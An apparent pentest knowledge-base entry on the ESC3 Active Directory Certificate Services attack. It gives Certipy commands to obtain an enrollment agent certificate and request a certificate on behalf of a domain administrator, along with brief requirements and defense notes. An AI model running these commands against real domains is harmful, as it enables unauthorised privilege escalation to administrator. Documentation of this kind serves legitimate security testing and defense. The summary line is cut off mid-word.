---
id: 422611b6-e1c2-4aa0-b77d-cc1f666b8be9
name: Misconfigured Enrollment Agent Templates
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:05.826186+00:00'
updated_at: '2023-04-10T20:26:24.871278+00:00'
tags:
- '[[Active Directory Attacks]]'
- '[[Active Directory Certificate Services]]'
- '[[ESC3 - Misconfigured Enrollment Agent Templates]]'
commands:
- '[[Create certificate request]]'
- '[[Create certificate request for user john]]'
---

# Misconfigured Enrollment Agent Templates

## Summary

Misconfigured Enrollment Agent Templates can be abused by attackers to request certificates on behalf of another user, bypassing normal access controls. This can be used to escalate privileges or evade detection. Attackers can use tools like Certipy to make these requests, potentially leading to th

## Description

# Description

Misconfigured Enrollment Agent Templates can be abused by attackers to request certificates on behalf of another user, bypassing normal access controls. This can be used to escalate privileges or evade detection. Attackers can use tools like Certipy to make these requests, potentially leading to the compromise of sensitive data or systems. From a business perspective, this attack can result in data breaches, financial losses, and damage to reputation.

## Requirements

1. Access to Active Directory Certificate Services

1. Valid user credentials

1. Tools like Certipy

## Defense

1. Ensure proper access controls are in place for Enrollment Agent Templates

1. Monitor certificate requests for unusual activity

1. Implement multi-factor authentication for certificate requests

## Objectives

1. Request certificates on behalf of other users

1. Bypass normal access controls

1. Escalate privileges

# Instructions

1. To request a certificate using Certipy, run the following command:

$ certipy req '<subject>' -ca '<ca>' -template '<template>'

Replace <subject> with the subject of the certificate, <ca> with the name of the certificate authority, and <template> with the name of the certificate template.

**Code**: [[$ certipy req 'corp.local/john:Passw0rd!@ca.corp.l]]

> This command requests a certificate from a certificate authority using Certipy. The <subject> parameter specifies the subject of the certificate in the format 'CN=Common Name,OU=Organizational Unit,O=Organization,L=Locality,S=State,C=Country'. The <ca> parameter specifies the name of the certificate authority. The <template> parameter specifies the name of the certificate template to use for the request.

**Command** ([[Create certificate request]]):

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'
```

2. To request a certificate on behalf of another user using the Certificate Request Agent certificate, use the following command:

**Code**: [[$ certipy req 'corp.local/john:Passw0rd!@ca.corp.l]]

> Replace 'corp.local/john:Passw0rd!@ca.corp.local' with the user's credentials and the CA server's FQDN, 'corp-CA' with the name of the CA, 'User' with the name of the certificate template, 'corp\administrator' with the account that has permission to request certificates on behalf of other users, and 'john.pfx' with the desired name of the exported certificate.

**Command** ([[Create certificate request for user john]]):

```bash
$ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\\administrator' -pfx 'john.pfx'
```

## Commands Used

- [[Create certificate request]]
- [[Create certificate request for user john]]

## Tags

- [[Active Directory Attacks]]
- [[Active Directory Certificate Services]]
- [[ESC3 - Misconfigured Enrollment Agent Templates]]
